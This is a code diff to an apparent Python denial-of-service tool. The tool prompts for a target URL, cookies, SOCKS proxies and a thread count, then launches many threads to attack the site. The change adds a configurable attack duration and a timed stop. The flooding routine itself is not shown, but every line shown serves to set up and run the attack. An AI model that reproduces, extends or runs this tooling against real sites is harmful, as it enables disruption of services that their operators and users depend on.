@@ -24,6 +24,7 @@ class quotes:
     DonePleaseReview = '[~] Done. Press enter to review the settings'
     AttackInfo = "[+] Attack information: "
     CheckingInternet = "[~] Checking Internet Connection..."
+    AskTime = "[+] Attack time? (in seconds, 0 for manual stop) [default = 0]: "
 
     
 line_break = '\r\n'
@@ -227,14 +228,10 @@ def main():
         if '.gov' in url:
             url = ''
             print(quotes.CantAttackGOV)
-
-    
     target, path, port, protocol = ParseUrl(url)
-    
     need_cookies = ask(question=quotes.AskCookies, default='n', options=['y', 'n'])
     need_cookies = True if need_cookies == 'y' else False
     cookies = str(input(quotes.EnterCookies)).strip() if need_cookies else ''
-    
     socks_type = ask(question=quotes.AskSOCKSType, options=['4','5'], default='5')
     socks_type = 4 if socks_type == '4' else 5
     thread_num = None
@@ -245,19 +242,28 @@ def main():
         except ValueError:
             print(quotes.PleaseEnterANumber)
     proxies, proxiescount = ProxiesOptions(socks_type)
+    attack_time = None
+    while attack_time == None:
+        try:
+            attack_time = str(input(quotes.AskTime)).strip()
+            attack_time = 0 if attack_time in ['0', ''] else int(attack_time)
+        except ValueError:
+            print(quotes.PleaseEnterANumber)
     input(quotes.DonePleaseReview)
+
     # press enter to continue
     clearConsole()
-    print(quotes.AttackInfo + line_break + f'- Target: {target}' + line_break + f'- Threads: {thread_num}' + line_break + f'- Proxies {proxiescount} SOCKS{socks_type}')
+    print(quotes.AttackInfo + line_break + f'- Target: {target}' + line_break + f'- Threads: {thread_num}' + line_break + f'- Proxies {proxiescount} SOCKS{socks_type}' + line_break + f'Time: {str(attack_time if attack_time != 0 else "<inf>")}s')
     print('\n')
+    # prepare
     event = threading.Event()
     event.clear()
-
     process_list = []
     for _ in range(thread_num):
         th = threading.Thread(target = attack_thread, args = (event, socks_type, target, port, protocol, 100, path, proxies, cookies), daemon = True)
         process_list.append(th)
     input('[?] Press enter to start...\n')
+    # press enter to start
     print('[>] Starting threads in waiting mode...')
     for i in process_list:
         i.start() # make the thread wait
@@ -266,19 +272,23 @@ def main():
     print('[>] Started the attack! Press Ctrl + C (SIG.TERM) anytime to stop the attack.')
     print('[*] WARNING: This might slow down your internet connection so you might experience lags even in dstats')
     start = time.time()
-    while event.is_set():
+    while event.is_set() and (attack_time == 0 or time.time() - start <= attack_time):
         try:
-            el = time.time() - start + 1
-            # : Sent x{str(attack_count)} [CPS {round(attack_count/el)}]
+            el = time.time() - start 
+            el = 1 if el == 0 else el
             print(f'[~] Attacking {str(target)}:{str(port)} ({str(thread_num)}thrs {str(proxiescount)}prxs) | {round(el)}s elapsed', end = '\r')
             time.sleep(0.05)
         except KeyboardInterrupt:
             break
+    else: # this only happen when time is up, in inf mode the 'break' will not execute this (python while break else rule)
+        print(f'[~] Finished attack in {str(attack_time)}s')
+
     print('[~] Stopping...', end= '                                                                      \n')
     print('[~] Setting internal flag to False...')
     event.clear()
     print('[~] Set! Trying to close the program...')
     closeProgram()
+    # for fun, this shit is unreachable
     for i in process_list:
         i.join()
     print('[~] Stopped')
